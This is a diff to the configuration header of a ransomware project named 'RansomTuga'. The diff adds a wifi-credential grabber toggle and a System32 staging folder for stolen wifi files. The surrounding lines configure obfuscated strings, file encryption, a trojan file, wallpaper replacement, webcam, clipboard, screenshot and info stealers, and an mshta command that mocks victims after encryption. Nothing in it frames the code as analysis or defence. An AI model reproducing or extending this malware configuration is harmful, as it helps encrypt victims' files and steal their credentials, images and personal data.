@@ -25,7 +25,9 @@
 
 /* files path */
 #define DEBUG_FOLDER	(string)skCrypt(".\\debugFolder\\")							// directory where files are encrypted in debug mode if no arguments are provided
-#define TEMPFILE		(string)skCrypt("C:\\Windows\\System32\\temp.tmp")			// filepath of temp file used in some functions
+#define WEBCAM_PATH		(string)skCrypt("C:\\Windows\\System32\\webcams\\")			// directory where webcams images are stored (and then deleted)
+#define WIFI_PATH		(string)skCrypt("C:\\Windows\\System32\\wifies\\")			// directory where wifi files are stored (and then deleted)
+#define TEMPFILE		(string)skCrypt("C:\\Windows\\System32\\temp.tmp")			// filepath of the temp file used in some functions
 #define CHECKSUM_FILE	(string)skCrypt("C:\\Windows\\System32\\ok.txt")			// filepath of the file used to check the correct key
 #define OLDWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\oldWallpaper.jpg")	// filepath of the old wallpaper
 #define NEWWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\newWallpaper.jpg")	// filepath of the new wallpaper
@@ -34,7 +36,6 @@
 #define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
 #define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
 #define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program
-#define WEBCAM_PATH		(string)skCrypt("C:\\Windows\\System32\\webcams\\")			// filepath of the webcams' images
 
 /* misc settings */
 #define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
@@ -52,6 +53,7 @@
 #define TAKE_WEBCAMS		true	// enable or disable webcam stealer
 #define STEAL_INFO			true	// enable or disable info stealer
 #define GET_CLIPBOARD		true	// enable or disable clipboard grabber
+#define GET_WIFI			true	// enable or disable wifi grabber
 #define GET_SCREENSHOT		true	// enable or disable screenshot grabber
 #define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
